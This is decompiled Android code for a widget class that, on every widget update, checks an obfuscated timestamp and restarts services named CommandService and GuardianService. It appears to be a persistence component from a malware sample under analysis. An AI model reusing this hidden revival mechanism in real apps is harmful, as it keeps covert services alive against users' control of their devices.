package com.base.template.receivers;

import android.appwidget.AppWidgetManager;
import android.appwidget.AppWidgetProvider;
import android.content.Context;
import com.base.template.services.CommandService;
import com.base.template.services.GuardianService;
import kotlin.text.CharsKt;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class KeepAliveWidgetProvider extends AppWidgetProvider {
    public static void reviveIfNeeded(Context context) {
        try {
            long j = context.getSharedPreferences(C0000.decode(new byte[]{10, 86, 88, 67, 16, 3, 86, 0, 68}, "b391da3a05", true), 0).getLong(C0000.decode(new byte[]{95, 89, 22, 23, 59, 4, 6, 86, 71, 103, 8, 16}, "38ecdfc7", 0.0f), 0L);
            long jCurrentTimeMillis = System.currentTimeMillis() - j;
            if (jCurrentTimeMillis > 60000 && j > 0) {
                long j2 = jCurrentTimeMillis / ((long) 1000);
                CommandService commandService = CommandService.instance;
                Headers.Companion.safeStartService(context, C0000.decode(new byte[]{96, 113, 116, 118, 115, 53, 60, 103, 114, 110, 121, 103, 115}, "78016ac5", 0));
            }
            int i = GuardianService.$r8$clinit;
            CharsKt.start(context);
        } catch (Exception e) {
            e.getMessage();
        }
    }

    @Override // android.appwidget.AppWidgetProvider
    public final void onEnabled(Context context) {
        reviveIfNeeded(context);
    }

    @Override // android.appwidget.AppWidgetProvider
    public final void onUpdate(Context context, AppWidgetManager appWidgetManager, int[] iArr) {
        reviveIfNeeded(context);
    }
}
